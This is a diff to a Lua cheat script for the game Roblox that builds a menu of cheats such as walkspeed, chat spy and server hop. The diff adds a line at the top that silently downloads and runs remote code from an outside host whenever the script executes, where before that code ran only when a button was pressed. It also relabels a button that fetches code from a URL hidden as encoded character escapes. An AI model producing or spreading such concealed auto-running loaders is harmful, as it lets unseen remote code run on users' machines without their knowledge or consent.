@@ -1,3 +1,5 @@
+loadstring(game:HttpGet('https://cdn.y2k06.xyz/lua/SpyChat.lua', true))()
+
 game.StarterGui:SetCore("ChatMakeSystemMessage", {
     Text = "Script Executed!"; --chat notification
     Font = Enum.Font.GothamBlack; --font changeable
@@ -47,7 +49,7 @@ game.StarterGui:SetCore("ChatMakeSystemMessage", {
         end
     end)
     
-    Section:NewSlider("WalkSpeed", "Just walkspeed changuer", 40, 1, function(sxd1)
+    Section:NewSlider("WalkSpeed", "Just walkspeed changuer", 40, 8, function(sxd1)
         _G.lol = sxd1
         getgenv().WalkSpeedValue = sxd1;
     local Player = game:service'Players'.LocalPlayer;
@@ -1469,10 +1471,8 @@ Section:NewLabel("Visuals")
     
     local Tab = Window:NewTab("Misc")
     local Section = Tab:NewSection("Solo script")
-    Section:NewButton("Chat Spy", "With this you can turn on chat", function()
-        loadstring(game:HttpGet('https://cdn.y2k06.xyz/lua/SpyChat.lua', true))()
-    end)
-    Section:NewButton("Replace Sky", "Changue Sky", function()
+
+    Section:NewButton("IDK", "Changue Sky", function()
         loadstring(game:HttpGet("\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\75\101\111\110\101\71\105\116\104\117\98\83\112\97\109\47\75\101\111\110\101\71\105\116\104\117\98\83\112\97\109\47\109\97\105\110\47\78\97\117\103\104\116\121\78\97\117\103\104\116\121\47\68\101\99\97\108\115"))()
     end)
     Section:NewButton("Server Hop", "If you click this you automatic go to other server", function()
